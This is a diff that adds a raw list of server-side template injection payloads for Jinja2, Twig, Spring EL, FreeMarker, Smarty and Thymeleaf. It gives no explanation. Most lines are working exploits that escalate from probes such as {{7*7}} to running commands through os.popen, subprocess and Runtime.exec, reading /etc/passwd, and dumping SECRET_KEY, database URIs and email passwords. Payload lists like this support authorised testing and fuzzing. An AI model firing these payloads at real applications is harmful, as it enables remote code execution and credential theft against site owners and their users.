@@ -1,0 +1,87 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}
+${7*'7'}
+{{config}}
+{{self}}
+${class}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}{% endif %}{% endfor %}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getProperty("user.dir")}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+@(1+1)
+@{1+1}
+#{1+1}
+*{1+1}
+${"freemarker.template.utility.Execute"?new()("id")}
+{{7*7}}{{7*7}}
+${7*7}${7*7}
+{{''.__class__}}
+{{''.__class__.__bases__}}
+{{''.__class__.__bases__[0]}}
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{self.__dict__}}
+{{self.__class__}}
+{{self.__class__.__mro__}}
+{{request.__class__}}
+{{config.__class__}}
+{{config.items()}}
+{{config.__class__.__init__.__globals__}}
+{{config.__class__.__init__.__globals__.keys()}}
+{{config.__class__.__init__.__globals__['os']}}
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{''.class.mro[1].subclasses()}}
+{% debug %}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('id', shell=True, stdout=-1).communicate()[0].strip() }}
+{php}echo `id`;{/php}
+{% eval "puts 'hello'" %}
+{{7*7}}
+{{7*'7'}}
+{{'7'*7}}
+{{config.items()}}
+{{request.environ}}
+{{request.environ['SECRET_KEY']}}
+{{request.environ['PATH']}}
+{{self.__dict__._TemplateReference__context.config.SECRET_KEY}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('id',shell=True)}}
+{% if request.application.__globals__.__builtins__.__import__('os').popen('id').read() %}yes{% endif %}
+{{7|int*7|int}}
+{{(7).__class__.__bases__[0].__subclasses__()[103].load_module('os').system('id')}}
+{{''.class.bases[0].subclasses()[40].init.globals.builtins.open('/etc/passwd').read()}}
+${7*7}
+${"".class}
+${"".__class__}
+${"".__class__.__mro__}
+${"".class.mro[1].subclasses()}
+${request}
+${application}
+#{7*7}
+#{''.class}
+#{request}
+#{session}
+*{7*7}
+*{''.class}
+[[${7*7}]]
+<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
+<#assign x="freemarker.template.utility.Execute"?new()>${x("whoami")}
+<#assign x="freemarker.template.utility.Execute"?new()>${x("cat /etc/passwd")}
+{{settings.SECRET_KEY}}
+{{settings.DATABASES}}
+{{settings.EMAIL_HOST_PASSWORD}}
+{{config.SECRET_KEY}}
+{{config.SQLALCHEMY_DATABASE_URI}}
